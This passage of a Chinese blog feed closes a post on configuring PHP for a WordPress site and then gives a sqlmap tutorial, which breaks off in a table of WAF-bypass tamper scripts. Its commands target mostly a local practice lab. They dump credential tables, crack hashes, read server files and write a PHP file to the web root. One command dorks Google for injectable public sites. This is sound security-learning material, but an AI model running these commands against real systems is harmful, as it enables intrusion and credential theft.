alt="image-20220325155507947"></p></li></ol><h3 id="配置php服务"><a href="#配置php服务" class="headerlink" title="配置php服务"></a>配置php服务</h3><ol><li><p>解压php安装包软件并编译安装,在编译期间,需要使用profix参数指定安装路径,使用–with-mysqli等参数开启对数据库的支持模块,为后面的在线安装网站做好准备<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251558038.png" alt="image-20220325155858960"></p><p> 生成二进制文件并进行安装<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251558038.png"></p></li><li><p>将生成的php服务配置文件复制到安装目录中(&#x2F;usr&#x2F;local&#x2F;php),让其生效.现在主配置文件有了,接下来还需要php-fpm的配置文件,在&#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;目录中有提供,只需复制就好<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251601933.png" alt="image-20220325160156873"></p><p> 复制一个模板文件到php-fpm.d的目录中,用于后续控制网站的连接性能<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251602117.png" alt="image-20220325160239059"></p></li><li><p>把php服务加入到启动项中,使其重启后依然生效<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251603924.png" alt="image-20220325160318868"></p></li><li><p>由于php服务程序的配置参数会对web服务的运行环境造成影响,如果默认开启了一些不必要的高危功能(如允许用户在网页中执行linux命令).因此需要编辑phpini配置文件,在第310行的disable_functions参数后面加上要禁止的功能.下面推荐禁止的.<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251606164.png" alt="image-20220325160605094"></p></li><li><p>开启php服务<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251606335.png" alt="image-20220325160636276"></p></li></ol><h3 id="搭建wordpress博客"><a href="#搭建wordpress博客" class="headerlink" title="搭建wordpress博客"></a>搭建wordpress博客</h3><p>为了检验lnmp动态网站架构环境是否配置妥当,可以在上面部署wordpress博客系统,然后查看效果.如果能在lnmp动态网站环境中成功安装并使用wordpress网站系统,也就意味着这套机构是可以使用的.</p><p>把nginx服务程序根目录的内容清空后,将wordpress解压后的文件复制进去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251617389.png" alt="image-20220325161718333"></p><p>为了能够让网站文件被Nginx服务程序顺利读取，应设置目录所有权的身份及可读写的权限</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251617125.png" alt="image-20220325161732077"></p><p>启动nginx服务,打开本机ip</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251620146.png" alt="image-20220325162055068"></p><p>单击图20-4中的“现在就开始”按钮，在随后出现的界面中依次输入刚刚建立的数据库名称、用户名及重置过的密码值。由于WordPress会要求用户自行创建好数据库，因此请确保网页中填写的数据库名称与刚才创建的一致，</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251621714.png" alt="image-20220325162152640"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251623089.png" alt="image-20220325162339012"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251624814.png" alt="image-20220325162420730"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用</title>
      <link href="/ctf/sql/sql-sqlmap%E4%BD%BF%E7%94%A8/"/>
      <url>/ctf/sql/sql-sqlmap%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><h2 id="看到sql发送的测试payload"><a href="#看到sql发送的测试payload" class="headerlink" title="看到sql发送的测试payload"></a>看到sql发送的测试payload</h2><p>sqlmap对一个点是进行了怎样的尝试和读取数据的可以使用-v参数</p><pre><code>0、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认）2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页面。</code></pre><p>如果想要看到sql发送的测试payload最好的等级就是3</p><h2 id="获取目标方式"><a href="#获取目标方式" class="headerlink" title="获取目标方式"></a>获取目标方式</h2><h3 id="目标url"><a href="#目标url" class="headerlink" title="目标url"></a>目标url</h3><p><strong>-u参数</strong></p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-2/?id=1  --batch</code></pre><h3 id="从文件中加载http请求"><a href="#从文件中加载http请求" class="headerlink" title="从文件中加载http请求"></a>从文件中加载http请求</h3><p><strong>-r参数</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232208283.png" alt="image-20220323220812216"></p><pre><code>python sqlmap.py -r C:\Users\14980\Desktop\1.php --batch</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232209505.png" alt="image-20220323220907435"></p><h3 id="从burp代理中获取日志"><a href="#从burp代理中获取日志" class="headerlink" title="从burp代理中获取日志"></a>从burp代理中获取日志</h3><p><strong>-i</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232132536.png" alt="image-20220323213215450"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232132557.png" alt="image-20220323213235481"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232133038.png" alt="image-20220323213319979"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232133133.png" alt="image-20220323213334072"></p><pre><code>python sqlmap.py -l D:\Download\test.log --batch</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232208513.png" alt="image-20220323220833445"></p><h3 id="处理谷歌的搜索请求"><a href="#处理谷歌的搜索请求" class="headerlink" title="处理谷歌的搜索请求"></a>处理谷歌的搜索请求</h3><p><strong>-g</strong></p><pre><code>python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;  --proxy=&quot;http://127.0.0.1:7890&quot; --batch</code></pre><h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><h3 id="http参数"><a href="#http参数" class="headerlink" title="http参数"></a>http参数</h3><p><strong>-data</strong></p><p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-11/ --data=&quot;uname=admin&amp;passwd=Dumb&amp;submit=Submit&quot; --batch</code></pre><h3 id="HTTP-cookie头"><a href="#HTTP-cookie头" class="headerlink" title="HTTP cookie头"></a>HTTP cookie头</h3><p><strong>–cookie,–load-cookies,–drop-set-cookie</strong></p><p>1、web应用需要登陆的时候。<br>2、你想要在这些头参数中测试SQL注入时。<br>可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里。<br>在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。<br>如果你不想接受Set-Cookie可以使用–drop-set-cookie参数来拒接。<br>当你使用–cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-20/index.php --cookie &quot;uname=Dumb&quot; --batch --level 2</code></pre><h3 id="HTTP-S-代理"><a href="#HTTP-S-代理" class="headerlink" title="HTTP(S)代理"></a>HTTP(S)代理</h3><p><strong>–proxy,–proxy-cred和–ignore-proxy</strong></p><p>使用–proxy代理是格式为：<a href="http://url:port。当HTTP(S)代理需要认证是可以使用--proxy-cred参数：username:password。--ignore-proxy拒绝使用本地局域网的HTTP(S)代理">http://url:port。当HTTP(S)代理需要认证是可以使用--proxy-cred参数：username:password。--ignore-proxy拒绝使用本地局域网的HTTP(S)代理</a></p><pre><code>python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;  --proxy=&quot;http://127.0.0.1:7890&quot; --batch</code></pre><h3 id="HTTP-User-Agent头"><a href="#HTTP-User-Agent头" class="headerlink" title="HTTP User-Agent头"></a>HTTP User-Agent头</h3><p><strong>–user-agent,–random-agent</strong></p><p>默认情况下sqlmap的HTTP请求头中User-Agent值是：</p><pre><code>sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)</code></pre><p> 可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从.&#x2F;txt&#x2F;user-agents.txt中获取.当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-18/index.php --data &quot;uname=Dumb,passwd=Dumb&quot; --user-agent &quot; Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&quot; --batch --level 3</code></pre><h3 id="HTTP-Referer头"><a href="#HTTP-Referer头" class="headerlink" title="HTTP Referer头"></a>HTTP Referer头</h3><p><strong>–referer</strong></p><p>sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-19/ --data &quot;uname=Dumb,passwd=Dumb&quot; --referer &quot;http://127.0.0.1/sqlilabs/Less-19/&quot; --batch --level 3</code></pre><h3 id="额外的HTTP头"><a href="#额外的HTTP头" class="headerlink" title="额外的HTTP头"></a>额外的HTTP头</h3><p><strong>–headers</strong></p><p>可以通过–headers参数来增加额外的http头</p><h3 id="设定超时时间"><a href="#设定超时时间" class="headerlink" title="设定超时时间"></a>设定超时时间</h3><p><strong>–timeout</strong></p><p>可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。</p><h3 id="设定重试超时"><a href="#设定重试超时" class="headerlink" title="设定重试超时"></a>设定重试超时</h3><p><strong>–retries</strong></p><p>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p><h3 id="设定随机改变的参数值"><a href="#设定随机改变的参数值" class="headerlink" title="设定随机改变的参数值"></a>设定随机改变的参数值</h3><p><strong>–randomize</strong></p><p>可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</p><h3 id="利用正则过滤目标网址"><a href="#利用正则过滤目标网址" class="headerlink" title="利用正则过滤目标网址"></a>利用正则过滤目标网址</h3><p><strong>–scope</strong></p><pre><code>python sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;</code></pre><h3 id="避免过多的错误请求被屏蔽"><a href="#避免过多的错误请求被屏蔽" class="headerlink" title="避免过多的错误请求被屏蔽"></a>避免过多的错误请求被屏蔽</h3><p><strong>–safe-url,–safe-freq</strong></p><p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p><p>绕过这个策略有两种方式：</p><ol><li>–safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。</li><li>–safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</li></ol><h3 id="关掉URL参数值编码"><a href="#关掉URL参数值编码" class="headerlink" title="关掉URL参数值编码"></a>关掉URL参数值编码</h3><p><strong>–skip-urlencode</strong></p><p>根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用–skip-urlencode参数。</p><h3 id="每次请求时候执行自定义的python代码"><a href="#每次请求时候执行自定义的python代码" class="headerlink" title="每次请求时候执行自定义的python代码"></a>每次请求时候执行自定义的python代码</h3><p><strong>–eval</strong></p><p>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。</p><pre><code>python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</code></pre><p>上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。</p><h3 id="HTTP请求延迟"><a href="#HTTP请求延迟" class="headerlink" title="HTTP请求延迟"></a>HTTP请求延迟</h3><p><strong>–delay</strong></p><p>可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p><h3 id="HTTP认证保护"><a href="#HTTP认证保护" class="headerlink" title="HTTP认证保护"></a>HTTP认证保护</h3><p><strong>参数：–auth-type,–auth-cred</strong></p><pre><code>这些参数可以用来登陆HTTP的认证保护支持三种方式1、Basic2、Digest3、NTLM</code></pre><h3 id="HTTP协议的证书认证"><a href="#HTTP协议的证书认证" class="headerlink" title="HTTP协议的证书认证"></a>HTTP协议的证书认证</h3><p><strong>–auth-cert</strong></p><p>当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</p><h3 id="参数拆分字符"><a href="#参数拆分字符" class="headerlink" title="参数拆分字符"></a>参数拆分字符</h3><p><strong>–param-del</strong></p><p>当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p><pre><code>python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users</code></pre><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="指定参数"><a href="#指定参数" class="headerlink" title="指定参数"></a>指定参数</h3><p><strong>-p,–skip,</strong>*</p><p>sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP  Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP  Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p “id,user-anget”,当你使用–level的值很大但是有个别参数不想测试的时候可以使用–skip参数。例如：–skip&#x3D;”user-angent.referer”</p><p>在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*</p><pre><code>python sqlmap.py -u &quot;http://127.0.0.1/param1/value1*/param2/value2/&quot;</code></pre><p>sqlmap将会测试value1的位置是否可注入。</p><h3 id="指定数据库"><a href="#指定数据库" class="headerlink" title="指定数据库"></a>指定数据库</h3><p><strong>–dbms</strong></p><p>默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有：</p><pre><code>MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2</code></pre><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --dbms mysql --batch</code></pre><h3 id="指定数据库服务系统"><a href="#指定数据库服务系统" class="headerlink" title="指定数据库服务系统"></a>指定数据库服务系统</h3><p><strong>–os</strong></p><p>默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --os windows --batch</code></pre><h3 id="注入payload"><a href="#注入payload" class="headerlink" title="注入payload"></a>注入payload</h3><p><strong>–prefix,–suffix</strong></p><p>代码中是这样调用数据库的</p><pre><code>$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;</code></pre><p>这时你就需要–prefix和–suffix参数了：</p><pre><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;</code></pre><p>这样执行的SQL语句变成：</p><pre><code>$query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1&quot;;</code></pre><h3 id="修改注入的数据"><a href="#修改注入的数据" class="headerlink" title="修改注入的数据"></a>修改注入的数据</h3><p><strong>–tamper</strong></p><p>可以使用–tamper参数对数据做修改来绕过WAF等</p><h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><h3 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h3><p><strong>–level</strong></p><p>共有五个等级，默认为1，sqlmap使用的payload可以在xml&#x2F;payloads.xml中看到，你也可以根据相应的格式添加自己的payload。这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent&#x2F;Referer头在level为3的时候就会测试。总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p><h3 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h3><p><strong>–risk</strong></p><p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p><h3 id="页面比较"><a href="#页面比较" class="headerlink" title="页面比较"></a>页面比较</h3><p><strong>–string,–not-string,–regexp,–code</strong></p><p>默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code&#x3D;200。</p><p><strong>–text-only,–titles</strong></p><p>有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用–text-only（HTTP响应体中不同）–titles（HTML的title标签中不同）。</p><h2 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h2><h3 id="测试是否是注入"><a href="#测试是否是注入" class="headerlink" title="测试是否是注入"></a>测试是否是注入</h3><p><strong>–technique</strong></p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --technique &quot;BEQSTU&quot; --batch</code></pre><h3 id="设定延迟注入的时间"><a href="#设定延迟注入的时间" class="headerlink" title="设定延迟注入的时间"></a>设定延迟注入的时间</h3><p><strong>–time-sec</strong></p><p>当使用继续时间的盲注时，时刻使用–time-sec参数设定延时时间，默认是5秒。</p><h3 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h3><p><strong>–second-order</strong></p><p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。–second-order后门跟一个判断页面的URL地址。</p><h2 id="列数据"><a href="#列数据" class="headerlink" title="列数据"></a>列数据</h2><h3 id="版本号"><a href="#版本号" class="headerlink" title="版本号"></a>版本号</h3><p><strong>-b,–banner</strong></p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -b --batch</code></pre><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p><strong>-current-user</strong></p><p>在大多数据库中可以获取到管理数据的用户。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -current-user --batch</code></pre><h3 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h3><p><strong>–current-db</strong></p><p>返还当前连接的数据库。</p><h3 id="当前用户是否为管理员"><a href="#当前用户是否为管理员" class="headerlink" title="当前用户是否为管理员"></a>当前用户是否为管理员</h3><p><strong>–is-dba</strong></p><p>判断当前的用户是否为管理，是的话会返回True。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --is-dba --batch</code></pre><h3 id="列数据库管理用户"><a href="#列数据库管理用户" class="headerlink" title="列数据库管理用户"></a>列数据库管理用户</h3><p><strong>–users</strong></p><p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --users --batch</code></pre><h3 id="列出并破解数据库用户的hash"><a href="#列出并破解数据库用户的hash" class="headerlink" title="列出并破解数据库用户的hash"></a>列出并破解数据库用户的hash</h3><p><strong>–passwords</strong></p><p>当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --passwords --batch</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241418046.png" alt="image-20220324141848955"></p><p>也可以提供-U参数来指定爆破哪个用户的hash。</p><h3 id="列出数据库管理员权限"><a href="#列出数据库管理员权限" class="headerlink" title="列出数据库管理员权限"></a>列出数据库管理员权限</h3><p><strong>–privileges</strong></p><p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --privileges --batch</code></pre><h3 id="列出数据库系统的数据库"><a href="#列出数据库系统的数据库" class="headerlink" title="列出数据库系统的数据库"></a>列出数据库系统的数据库</h3><p><strong>–dbs</strong></p><p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --dbs --batch</code></pre><h3 id="列举数据库表"><a href="#列举数据库表" class="headerlink" title="列举数据库表"></a>列举数据库表</h3><p><strong>–tables,–exclude-sysdbs,-D</strong></p><p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。–exclude-sysdbs参数是指包含了所有的系统数据库。需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -D &quot;security&quot; --tables --batch</code></pre><h3 id="列举数据库表中的字段"><a href="#列举数据库表中的字段" class="headerlink" title="列举数据库表中的字段"></a>列举数据库表中的字段</h3><p><strong>–columns,-C,-T,-D</strong></p><p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -D &quot;security&quot; -T &quot;users&quot; --columns --batch</code></pre><h3 id="获取整个表的数据"><a href="#获取整个表的数据" class="headerlink" title="获取整个表的数据"></a>获取整个表的数据</h3><p><strong>–dump,-C,-T,-D,–start,–stop,–first,–last</strong></p><p>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump --batch</code></pre><p>如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可hi使用–stop 1，如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。</p><p>也可以用–first与–last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用–first 3 –last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p><h3 id="列举数据库系统的架构"><a href="#列举数据库系统的架构" class="headerlink" title="列举数据库系统的架构"></a>列举数据库系统的架构</h3><p><strong>–schema,–exclude-sysdbs</strong></p><p>用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。加上–exclude-sysdbs参数，将不会获取数据库自带的系统库内容。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --schema --batch </code></pre><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --schema --batch --exclude-sysdbs</code></pre><h3 id="获取表中数据个数"><a href="#获取表中数据个数" class="headerlink" title="获取表中数据个数"></a>获取表中数据个数</h3><p><strong>–count</strong></p><p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -D &quot;security&quot; -T &quot;users&quot; --count --batch</code></pre><h3 id="获取所有数据库表的内容"><a href="#获取所有数据库表的内容" class="headerlink" title="获取所有数据库表的内容"></a>获取所有数据库表的内容</h3><p><strong>–dump-all,–exclude-sysdbs</strong></p><p>使用–dump-all参数获取所有数据库表的内容，可同时加上–exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --dump-all --batch</code></pre><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --dump-all --batch --exclude-sysdbs</code></pre><h3 id="搜索字段，表，数据库"><a href="#搜索字段，表，数据库" class="headerlink" title="搜索字段，表，数据库"></a>搜索字段，表，数据库</h3><p><strong>–search,-C,-T,-D</strong></p><p>–search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。</p><p>可以在一下三种情况下使用：</p><ul><li>-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。</li><li>-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名</li><li>-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。</li></ul><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="暴力破解表名"><a href="#暴力破解表名" class="headerlink" title="暴力破解表名"></a>暴力破解表名</h3><p><strong>–common-tables</strong></p><p>当使用–tables无法获取到数据库的表时，可以使用此参数。</p><p>1、MySQL数据库版本小于5.0，没有information_schema表。<br>2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。<br>3、当前用户没有权限读取系统中保存数据结构的表的权限。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -D &quot;security&quot; --common-tables --batch</code></pre><h3 id="暴力破解列名"><a href="#暴力破解列名" class="headerlink" title="暴力破解列名"></a>暴力破解列名</h3><p><strong>–common-columns</strong></p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -D &quot;security&quot; -T &quot;users&quot; --common-columns --batch</code></pre><h2 id="系统文件操作"><a href="#系统文件操作" class="headerlink" title="系统文件操作"></a>系统文件操作</h2><h3 id="从数据库服务器中读取文件"><a href="#从数据库服务器中读取文件" class="headerlink" title="从数据库服务器中读取文件"></a>从数据库服务器中读取文件</h3><p><strong>–file-read</strong></p><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --file-read &quot;D:\Data\secquan\tools\Environment\PhpStudy\PHPTutorial\WWW\tset.php&quot; --batch</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241440477.png" alt="image-20220324144015390"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241440264.png" alt="image-20220324144026173"></p><h3 id="把文件上传到数据库服务器中"><a href="#把文件上传到数据库服务器中" class="headerlink" title="把文件上传到数据库服务器中"></a>把文件上传到数据库服务器中</h3><p><strong>–file-write,–file-dest</strong></p><p>file-write 从本地写入       file-dest 写入目标路径加文件名</p><pre><code>python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --file-write &quot;D:\MyCtf\文件上传\6.PHP&quot; --file-dest &quot;D:\Data\secquan\tools\Environment\PhpStudy\PHPTutorial\WWW\\zf.php&quot; --batch</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241445350.png" alt="image-20220324144553257"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241446754.png" alt="image-20220324144601666"></p><h2 id="常规参数"><a href="#常规参数" class="headerlink" title="常规参数"></a>常规参数</h2><h3 id="非交互模式"><a href="#非交互模式" class="headerlink" title="非交互模式"></a>非交互模式</h3><p><strong>–batch</strong></p><p>用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p><h3 id="预估完成时间"><a href="#预估完成时间" class="headerlink" title="预估完成时间"></a>预估完成时间</h3><p><strong>–eta</strong></p><p>可以计算注入数据的剩余时间。</p><h3 id="使用DBMS的hex函数"><a href="#使用DBMS的hex函数" class="headerlink" title="使用DBMS的hex函数"></a>使用DBMS的hex函数</h3><p><strong>–hex</strong></p><p>有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免</p><h2 id="Tamper-速查"><a href="#Tamper-速查" class="headerlink" title="Tamper 速查"></a>Tamper 速查</h2><table><thead><tr><th>脚本名称</th><th>作用</th></tr></thead><tbody><tr><td>apostrophemask.py</td><td>用utf8代替引号</td></tr><tr><td>equaltolike.py</td><td>like 代替等号</td></tr><tr><td>space2dash.py</td><td>绕过过滤’&#x3D;’ 替换空格字符(“)，(‘’ - ‘)后跟一个破折号注释，一个随机字符串和一个新行(‘n’)</td></tr><tr><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td></tr><tr><td>space2hash.py</td><td>空格替换为#号 随机字符串 